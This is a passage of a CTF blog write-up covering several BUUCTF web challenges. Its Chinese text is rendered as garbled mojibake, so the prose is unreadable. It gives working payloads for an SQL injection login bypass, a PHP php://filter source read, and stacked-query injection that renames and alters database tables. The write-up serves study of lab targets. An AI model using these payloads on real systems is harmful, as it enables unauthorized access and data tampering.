<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="ä¸€ã€EasySQL                           ğŸ”ºSQLæ³¨å…¥ç™»å½•       ç®€å•çš„SQLæ³¨å…¥                     1.æŸ¥çœ‹ç½‘é¡µæºä»£ç         å¯ä»¥çœ‹åˆ°æ˜¯check.phpåœ¨å¯¹ç™»å½•æŒ‰é’®è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨çš„æ–¹æ³•æ˜¯GETï¼ŒåŠ ä¸Šé¢˜ç›®æç¤ºæ˜¯SQLæ³¨å…¥ï¼Œæ‰€ä»¥å°±ç›´æ¥å°è¯•SQLæ³¨å…¥ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="é™ªXXçš„WebBUUåˆ·é¢˜(ä¸€)">
<meta property="og:url" content="http://pig-007.github.io/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="ä¸€ã€EasySQL                           ğŸ”ºSQLæ³¨å…¥ç™»å½•       ç®€å•çš„SQLæ³¨å…¥                     1.æŸ¥çœ‹ç½‘é¡µæºä»£ç         å¯ä»¥çœ‹åˆ°æ˜¯check.phpåœ¨å¯¹ç™»å½•æŒ‰é’®è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨çš„æ–¹æ³•æ˜¯GETï¼ŒåŠ ä¸Šé¢˜ç›®æç¤ºæ˜¯SQLæ³¨å…¥ï¼Œæ‰€ä»¥å°±ç›´æ¥å°è¯•SQLæ³¨å…¥ã€‚">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346998.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061423772.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071147850.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071149004.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071209055.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071210256.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071216007.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071218337.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071253029.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071623241.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629819.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629659.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642873.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642355.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071711484.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071717419.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091203487.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091204354.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206984.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206321.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091207995.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091210479.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091211532.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091834445.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091835473.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091836077.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091837080.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091838079.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102003467.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102004540.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102021256.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111127902.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136396.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136522.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111449555.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451527.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451771.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111452893.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412036.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412596.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111413501.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111414701.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111415489.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111417813.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418470.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418007.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420138.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420811.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422737.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422352.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202373.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202287.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121204190.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121206053.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121207056.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210799.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210905.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121213219.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121218740.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121906058.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121912749.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131203691.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156038.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156886.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131211277.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131212797.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131507999.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131518370.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161845497.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161859892.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220711121051309.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220712144242517.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220713111008888.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220726173826850.png">
<meta property="article:published_time" content="2022-01-06T02:25:33.000Z">
<meta property="article:modified_time" content="2022-08-05T06:28:56.006Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="é™ªXXçš„WebBUUåˆ·é¢˜">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png"><title>é™ªXXçš„WebBUUåˆ·é¢˜(ä¸€) | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">é™ªXXçš„WebBUUåˆ·é¢˜(ä¸€)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-08-05</span></span></div></header><div class="post-body">
        <h1 id="ä¸€ã€EasySQL"   >
          <a href="#ä¸€ã€EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€EasySQL" class="headerlink" title="ä¸€ã€EasySQL"></a>ä¸€ã€EasySQL</h1>
      
        <h2 id="ğŸ”ºSQLæ³¨å…¥ç™»å½•"   >
          <a href="#ğŸ”ºSQLæ³¨å…¥ç™»å½•" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºSQLæ³¨å…¥ç™»å½•" class="headerlink" title="ğŸ”ºSQLæ³¨å…¥ç™»å½•"></a>ğŸ”ºSQLæ³¨å…¥ç™»å½•</h2>
      <p>ç®€å•çš„SQLæ³¨å…¥</p>

        <h2 id="1-æŸ¥çœ‹ç½‘é¡µæºä»£ç "   >
          <a href="#1-æŸ¥çœ‹ç½‘é¡µæºä»£ç " class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æŸ¥çœ‹ç½‘é¡µæºä»£ç " class="headerlink" title="1.æŸ¥çœ‹ç½‘é¡µæºä»£ç "></a>1.æŸ¥çœ‹ç½‘é¡µæºä»£ç </h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png" alt="image-20220106105755040"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯check.phpåœ¨å¯¹ç™»å½•æŒ‰é’®è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨çš„æ–¹æ³•æ˜¯GETï¼ŒåŠ ä¸Šé¢˜ç›®æç¤ºæ˜¯SQLæ³¨å…¥ï¼Œæ‰€ä»¥å°±ç›´æ¥å°è¯•SQLæ³¨å…¥ã€‚</p>

        <h2 id="2-æ³¨å…¥åŸç†"   >
          <a href="#2-æ³¨å…¥åŸç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ³¨å…¥åŸç†" class="headerlink" title="2.æ³¨å…¥åŸç†"></a>2.æ³¨å…¥åŸç†</h2>
      <p>ç”±äºSQLæ³¨å…¥ä¸­æ¶‰åŠå•å¼•å·å’ŒåŒå¼•å·ï¼Œä¸”å¯¹å­—ç¬¦ä¸²çš„å¤„ç†åŸºæœ¬éƒ½æ˜¯å•å¼•å·è¿›è¡Œå¤„ç†ï¼Œæ£€æµ‹ä¸€ä¸‹ï¼Œå€˜è‹¥æˆ‘ä»¬ä½¿ç”¨åŒå¼•å·è¿›è¡Œæ³¨å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=aaa&#x27; or &quot;1&quot;=&quot;1&amp;password=aaa&#x27; or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå‡ºç°å¦‚ä¸‹é”™è¯¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346998.png" alt="image-20220106110800649"></p>
<p>é‚£ä¹ˆé‡‡ç”¨å•å¼•å·è¿›è¡Œæ³¨å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=aaa&#x27; or &#x27;1&#x27;=&#x27;1&amp;password=aaa&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åå³å¯æˆåŠŸ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061423772.png" alt="image-20220106142353692"></p>

        <h1 id="äºŒã€"   >
          <a href="#äºŒã€" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€" class="headerlink" title="äºŒã€"></a>äºŒã€</h1>
      <p>1.HTMLæ ‡ç­¾</p>
<p>metaæ ‡ç­¾</p>

        <h1 id="ä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Havefun1"   >
          <a href="#ä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Havefun1" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Havefun1" class="headerlink" title="ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun1"></a>ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun1</h1>
      
        <h2 id="ğŸ”ºç®€å•æŸ¥è¯¢"   >
          <a href="#ğŸ”ºç®€å•æŸ¥è¯¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºç®€å•æŸ¥è¯¢" class="headerlink" title="ğŸ”ºç®€å•æŸ¥è¯¢"></a>ğŸ”ºç®€å•æŸ¥è¯¢</h2>
      <p>æŸ¥çœ‹æºä»£ç ï¼Œè·³è¿‡csså’Œstyleéƒ¨åˆ†</p>
<p>å¯ä»¥çœ‹åˆ°æ³¨é‡Šéƒ¨åˆ†çš„æç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071147850.png" alt="image-20220107114730804"></p>
<p>å³å½“cat=dogæ—¶ï¼Œå°±ä¼šè¾“å‡ºSyc{cat_cat_cat}ï¼Œä½†æ˜¯ä¸€èˆ¬è¿™éƒ½æ˜¯ä½œè€…ç»™çš„æç¤ºï¼Œå®é™…è¾“å‡ºå†…å®¹å¯èƒ½ä¸æ˜¯Syc{cat_cat_cat}ï¼Œæ‰€ä»¥å…ˆå°è¯•ä¸€æ³¢</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/index.php?cat=dog</span><br></pre></td></tr></table></div></figure>

<p>ç›´æ¥å‡ºflagäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071149004.png" alt="image-20220107114926958"></p>

        <h1 id="å››ã€-ACTF2020-æ–°ç”Ÿèµ›-Include"   >
          <a href="#å››ã€-ACTF2020-æ–°ç”Ÿèµ›-Include" class="heading-link"><i class="fas fa-link"></i></a><a href="#å››ã€-ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="å››ã€[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>å››ã€[ACTF2020 æ–°ç”Ÿèµ›]Include</h1>
      
        <h2 id="ğŸ”ºPHPä¼ªåè®®"   >
          <a href="#ğŸ”ºPHPä¼ªåè®®" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºPHPä¼ªåè®®" class="headerlink" title="ğŸ”ºPHPä¼ªåè®®"></a>ğŸ”ºPHPä¼ªåè®®</h2>
      
        <h2 id="1-å‰ç½®æ¢ç´¢"   >
          <a href="#1-å‰ç½®æ¢ç´¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®æ¢ç´¢" class="headerlink" title="1.å‰ç½®æ¢ç´¢"></a>1.å‰ç½®æ¢ç´¢</h2>
      <p>ç‚¹å‡»tipsä¹‹åå‘ç°è¾“å‡ºæç¤ºï¼Œè·å–åˆ°ä½¿ç”¨fileåè®®çš„flag.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071209055.png" alt="image-20220107120937019"></p>
<p>æŸ¥çœ‹flag.phpçš„ç½‘é¡µæºä»£ç ä½†æ˜¯ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071210256.png" alt="image-20220107121010226"></p>
<p>ä¹‹åå°è¯•åˆ©ç”¨phpçš„ä¼ªåè®®æ¥è¯»å–flag.phpçš„æºä»£ç </p>

        <h2 id="2-phpä¼ªåè®®åˆ©ç”¨"   >
          <a href="#2-phpä¼ªåè®®åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpä¼ªåè®®åˆ©ç”¨" class="headerlink" title="2.phpä¼ªåè®®åˆ©ç”¨"></a>2.phpä¼ªåè®®åˆ©ç”¨</h2>
      <p>è¿™ä¸ªæ¯”è¾ƒå¤æ‚ï¼Œä¹‹åå†ä¸“é—¨æ€»ç»“ä¸€ä¸‹ï¼Œåæ­£è¿™é‡Œæ¶‰åŠäº†fileï¼Œé‚£ä¹ˆå°è¯•ç”¨è¯¥åè®®çš„payloadæ¥è¯»å–</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œç»™å‡ºçš„æ˜¯æ¯”è¾ƒæ™®éæ€§çš„ï¼Œç”¨base64æ¥è¿›è¡Œè·å–çš„ï¼Œè¯»å–ä¹‹åå¾—åˆ°base64ç¼–ç çš„ä¸€ä¸²å­—ç¬¦</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071216007.png" alt="image-20220107121629962"></p>

        <h2 id="3-base64è§£ç "   >
          <a href="#3-base64è§£ç " class="heading-link"><i class="fas fa-link"></i></a><a href="#3-base64è§£ç " class="headerlink" title="3.base64è§£ç "></a>3.base64è§£ç </h2>
      <p>è·å–åˆ°ä¸Šé¢çš„base64ç¼–ç åï¼Œè¿ç”¨CyberChefè§£ç å³å¯å¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071218337.png" alt="image-20220107121805266"></p>

        <h1 id="äº”ã€-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1"   >
          <a href="#äº”ã€-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1" class="heading-link"><i class="fas fa-link"></i></a><a href="#äº”ã€-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1" class="headerlink" title="äº”ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1"></a>äº”ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1</h1>
      
        <h2 id="ğŸ”ºSQLæ³¨å…¥-ä¸‰ç§å§¿åŠ¿"   >
          <a href="#ğŸ”ºSQLæ³¨å…¥-ä¸‰ç§å§¿åŠ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºSQLæ³¨å…¥-ä¸‰ç§å§¿åŠ¿" class="headerlink" title="ğŸ”ºSQLæ³¨å…¥+ä¸‰ç§å§¿åŠ¿"></a>ğŸ”ºSQLæ³¨å…¥+ä¸‰ç§å§¿åŠ¿</h2>
      <p>å¯ä»¥å…ˆç”¨å•å¼•å·åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;</span><br></pre></td></tr></table></div></figure>

<p>å‡ºç°å¦‚ä¸‹ï¼Œå‡ºé”™åˆ™ä»£è¡¨å­˜åœ¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071253029.png" alt="image-20220107125314983"></p>
<p>é‚£ä¹ˆå…ˆæŸ¥è¯¢å­˜åœ¨çš„è¡¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show tables;#</span><br></pre></td></tr></table></div></figure>

<p>å‘ç°æœ‰å¦‚ä¸‹ä¸¤ä¸ªè¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071623241.png" alt="image-20220107162320203"></p>
<p>ç„¶ååˆ†åˆ«æŸ¥çœ‹ä¸€ä¸‹å¯¹åº”çš„</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show columns from words;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629819.png" alt="image-20220107162923778"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629659.png" alt="image-20220107162957623"></p>
<p>é‚£ä¹ˆflagå°±åœ¨è¡¨1919810931114514ä¸­ï¼Œæ³¨æ„æŸ¥è¯¢æ•°å­—è¡¨çš„æ—¶å€™éœ€è¦åŠ <strong>åå¼•å·`</strong></p>

        <h2 id="è§£æwordsè¡¨"   >
          <a href="#è§£æwordsè¡¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æwordsè¡¨" class="headerlink" title="è§£æwordsè¡¨"></a>è§£æwordsè¡¨</h2>
      <p>é‚£ä¹ˆç”±äºè¾“å…¥1ï¼Œ2ä¼šå‡ºç°å¦‚ä¸‹æ•°æ®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642873.png" alt="image-20220107164211829"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642355.png" alt="image-20220107164221323"></p>
<p>è¿™é‡Œçš„ç¬¬äºŒä¸ªæ•°æ®æ®µæ˜¯å­—ç¬¦å‹ï¼Œé‚£ä¹ˆå°±åº”è¯¥æ˜¯åœ¨è¡¨wordsä¸­ï¼Œæ­¤æ—¶å°±å¤§æ¦‚æ˜¯å¦‚ä¸‹çš„è¡¨æ ¼</p>
<div class="table-container"><table>
<thead>
<tr>
<th>id</th>
<th>data</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>hahahah</td>
</tr>
<tr>
<td>2</td>
<td>miaomiaomiao</td>
</tr>
</tbody></table></div>

        <h2 id="è§£æ1919810931114514è¡¨"   >
          <a href="#è§£æ1919810931114514è¡¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ1919810931114514è¡¨" class="headerlink" title="è§£æ1919810931114514è¡¨"></a>è§£æ<code>1919810931114514</code>è¡¨</h2>
      <p>ä¾æ®åˆ—å¤§æ¦‚çŒœæµ‹å¦‚ä¸‹</p>
<div class="table-container"><table>
<thead>
<tr>
<th>flag</th>
</tr>
</thead>
<tbody><tr>
<td>â€¦â€¦â€¦..ä¸çŸ¥</td>
</tr>
</tbody></table></div>
<p>è¿™é‡Œselectè¢«è¿‡æ»¤äº†ï¼Œæ— æ³•ç›´æ¥ä»è¡¨1919810931114514ä¸­è·å–æ‰€ä»¥å°è¯•ä¸€ä¸‹å…¶ä»–çš„è§£æ³•ã€‚</p>

        <h2 id="1-è§£æ³•ä¸€-æ”¹è¡¨"   >
          <a href="#1-è§£æ³•ä¸€-æ”¹è¡¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è§£æ³•ä¸€-æ”¹è¡¨" class="headerlink" title="1.è§£æ³•ä¸€(æ”¹è¡¨)"></a>1.è§£æ³•ä¸€(æ”¹è¡¨)</h2>
      <p>ä¿®æ”¹è¡¨åå­—ï¼Œä½¿å¾—ä¿å­˜flagçš„è¡¨1919810931114514åå­—å˜ä¸ºè¡¨wordsï¼Œä¹‹åæŠŠflagå­—æ®µå˜ä¸ºdataå­—æ®µï¼Œæ·»åŠ idå­—æ®µï¼Œè¾“å…¥1,2ç„¶åå°±å¯ä»¥æ‰“å°å‡ºflagäº†ã€‚</p>

        <h3 id="1-æ”¹å"   >
          <a href="#1-æ”¹å" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ”¹å" class="headerlink" title="(1)æ”¹å"></a>(1)æ”¹å</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; rename table words to word1; rename table `1919810931114514` to words;#</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å¢æ·»idå­—æ®µ"   >
          <a href="#2-å¢æ·»idå­—æ®µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¢æ·»idå­—æ®µ" class="headerlink" title="(2)å¢æ·»idå­—æ®µ"></a>(2)å¢æ·»idå­—æ®µ</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; alter table words add id int unsigned not Null auto_increment primary key;#</span><br></pre></td></tr></table></div></figure>


